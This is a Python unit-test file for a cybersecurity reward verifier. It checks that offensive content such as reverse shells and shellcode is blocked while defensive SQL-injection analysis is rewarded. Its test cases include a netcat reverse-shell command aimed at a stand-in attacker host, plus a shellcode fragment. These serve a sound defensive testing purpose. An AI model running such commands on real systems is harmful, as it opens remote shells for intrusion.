"""
Unit tests for safety gates and verifier logic.
These tests don't require the server to be running.
"""
import sys
import os

# Add backend to path so we can import
sys.path.insert(0, os.path.join(os.path.dirname(__file__), 'backend'))

from app.verifiers.cyber_defensive import (
    VulnerabilityScannerVerifier,
    CyberAntiHackingVerifier,
    OverEngineeringDetector,
    PatchVerifier,
)
from app.services.verification_service import VerificationService
import json


def test_safety_gate_rejection():
    """Test that offensive content is rejected with reward 0.0."""
    print("=== Test 1: Safety Gate Rejection ===")
    
    verifier = CyberAntiHackingVerifier()
    
    # Test reverse shell detection
    result = verifier.verify("test", "Here's a reverse shell: nc -e /bin/sh")
    print(f"Reverse shell test: reward={result['reward']}, status={result['details'].get('status')}")
    assert result['reward'] < 0.5 or result['details'].get('status') == 'blocked', "FAIL: Reverse shell not blocked"
    print("[PASS] Reverse shell blocked")
    
    # Test exploit payload detection
    verifier2 = VulnerabilityScannerVerifier()
    result2 = verifier2.verify(
        "test", 
        "Use this exploit payload to hack: shellcode = '\\x90' * 100",
        target_code="code"
    )
    print(f"Exploit payload test: reward={result2.get('reward')}, status={result2.get('details', {}).get('status')}")
    assert result2.get('reward') == 0.0, f"FAIL: Exploit payload not rejected (reward={result2.get('reward')})"
    print("[PASS] Exploit payload rejected")
    
    print("[ALL SAFETY GATE TESTS PASSED]")


def test_valid_evaluation():
    """Test that valid content gets a meaningful composite_reward."""
    print("=== Test 2: Valid Evaluation ===")
    
    service = VerificationService()
    
    payload = {
        "prompt": "Analyze this code for vulnerabilities",
        "response": "I found SQL injection because input is not sanitized. Use parameterized queries to fix this. The root cause is improper input handling.",
        "target_code": "SELECT * FROM users WHERE id = '" + "user_input" + "'"
    }
    
    result = service.run_cyber_defensive_evaluation(payload)
    print(f"Status: {result.get('status')}")
    print(f"Composite reward: {result.get('composite_reward')}")
    
    assert result.get('status') == 'completed', f"FAIL: Status is {result.get('status')}"
    assert 'composite_reward' in result, "FAIL: No composite_reward returned"
    assert result['composite_reward'] > 0.0, f"FAIL: composite_reward is {result['composite_reward']}"
    print(f"[PASS] Valid evaluation returned composite_reward = {result['composite_reward']}\n")


def test_exploit_payload_blocking():
    """Test various exploit payloads are blocked."""
    print("=== Test 3: Exploit Payload Blocking ===")
    
    verifier = CyberAntiHackingVerifier()
    
    test_cases = [
        ("reverse shell", "nc -e /bin/sh attacker.com 4444"),
        ("shellcode", "shellcode = '\\x90\\x90\\x90'"),
        ("zero-day", "This is a zero-day exploit"),
        ("RCE", "Remote code execution via this payload"),
    ]
    
    for name, text in test_cases:
        result = verifier.verify("test", text)
        if result['reward'] < 0.5 or result['details'].get('status') == 'blocked':
            print(f"[PASS] {name} blocked (reward={result['reward']})")
        else:
            print(f"[FAIL] {name} not blocked (reward={result['reward']})")
    
    print()


def test_composite_reward_components():
    """Test that composite_reward has meaningful components."""
    print("=== Test 4: Composite Reward Components ===")
    
    service = VerificationService()
    
    payload = {
        "prompt": "Analyze this code",
        "response": "Found SQL injection because unsafe concatenation. Impact: data breach. Use parameterized queries. This is a simple fix.",
        "target_code": "vulnerable code"
    }
    
    result = service.run_cyber_defensive_evaluation(payload)
    
    assert result.get('status') == 'completed'
    details = result.get('vuln_analysis', {}).get('details', {})
    print(f"Accuracy: {details.get('accuracy')}")
    print(f"Reasoning: {details.get('reasoning')}")
    print(f"Remediation: {details.get('remediation')}")
    print(f"Calibration: {details.get('calibration')}")
    print(f"Composite reward: {result.get('composite_reward')}")
    print("[PASS] All components present\n")


if __name__ == "__main__":
    print("Running Mythos Safe Enterprise Unit Tests...\n")
    
    try:
        test_safety_gate_rejection()
        test_valid_evaluation()
        test_exploit_payload_blocking()
        test_composite_reward_components()
        
        print("=" * 50)
        print("[ALL TESTS PASSED]")
        print("=" * 50)
    except AssertionError as e:
        print(f"[TEST FAILED] {e}")
        sys.exit(1)
    except Exception as e:
        print(f"[ERROR] {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
